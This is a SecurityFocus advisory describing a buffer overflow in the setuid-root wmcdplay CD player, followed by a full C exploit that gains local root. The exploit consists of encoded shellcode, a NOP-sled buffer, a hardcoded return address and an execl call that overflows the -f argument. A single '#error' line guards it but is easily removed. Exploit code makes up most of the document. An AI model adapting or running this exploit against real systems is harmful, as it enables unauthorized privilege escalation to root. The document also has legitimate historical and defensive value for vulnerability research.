source: http://www.securityfocus.com/bid/1047/info

wmcdplay is cdplayer generally used with the WindowMaker X11 window-manager on unix systems. While wmcdplay is rarely installed at all by default, when it is installed it is typically set setuid root. wmcdplay is vulnerable to a buffer overflow attack due to lack of bounds checking on an argument it is passed. As a result, a local user can elevate their priviliges to root through overruning the stack and executing arbitrary code with the effective user-id of the process (root).

/*** Halloween 4 local root exploit for wmcdplay. Other distros are
 *** maybe affected as well.
 *** (C) 2000 by C-skills development. Under the GPL. 
 *** 
 *** Bugdiscovery + exploit by S. Krahmer & Stealth.
 ***
 *** This exploit was made (possible by|for) the team TESO and CyberPsychotic, the
 *** OpenBSD-freak. :-) Greets to all our friends. You know who you are.
 *** 
 ***
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 *** other advisories and kewl stuff at:
 *** http://www.cs.uni-potsdam.de/homepages/students/linuxer
 ***
 ***/
#include <stdio.h>

/* The shellcode can't contain '/' as wmcdplay will exit then.
 * So i used Stealth's INCREDIBLE hellkit to generate these code! :-)
 */
char shell[] =
"\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0d\x31\xc9\xb1\x68\x80\x36\x01\x46\xe2\xfa"
"\xea\x09\x2e\x63\x68\x6f\x2e\x72\x69\x01\x80\xed\x66\x2a\x01\x01"
"\x54\x88\xe4\x82\xed\x1d\x56\x57\x52\xe9\x01\x01\x01\x01\x5a\x80\xc2\xbb\x11"
"\x01\x01\x8c\xba\x2b\xee\xfe\xfe\x30\xd3\xc6\x44\xfd\x01\x01\x01\x01\x88\x7c"
"\xf9\xb9\x16\x01\x01\x01\x88\xd7\x52\x88\xf2\xcc\x81\x8c\x4c\xf9\xb9\x0a\x01"
"\x01\x01\x88\xff\x52\x88\xf2\xcc\x81\x5a\x5f\x5e\x88\xed\x5c\xc2\x91\x91\x91"
"\x91\x91\x91\x91\x91\x91\x91\x91\x91\x91\x91\x91";

/* filename-buffer plus ret + ebp - defaultpath 
 */
#define buflen (256+8 - 28)
#error "no kids please"

int main(int argc, char **argv)
{						       		
	char *wm[] = {
		"/usr/X11R6/bin/wmcdplay", 
		"-f", 
		"-display", "0:0", /* one might comment this if already running on X; remotely you can
				    * give your own server
		                    */
		0
	};
	
	char boom[buflen+10];
	int i = 0, j = 0, ret =  0xbffff796;	/* this address works for me */

	memset(boom, 0, sizeof(boom));
	memset(boom, 0x90, buflen);
	if (argc > 1)
		ret += atoi(argv[1]);
	else
		printf("You can also add an offset to the commandline. 40 worked for me on the console.\n");
	for (i = buflen-strlen(shell)-4; i < buflen-4; i++)
		boom[i] = shell[j++];
	*(long*)(&boom[i]) = ret; 
	
	printf("Get the real deal at http://www.cs.uni-potsdam.de/homepages/students/linuxer\n"
	       "Respect other users privacy!\n");
	       
	execl(wm[0], wm[0], wm[1], boom, wm[2], wm[3], 0);
	return 0;
}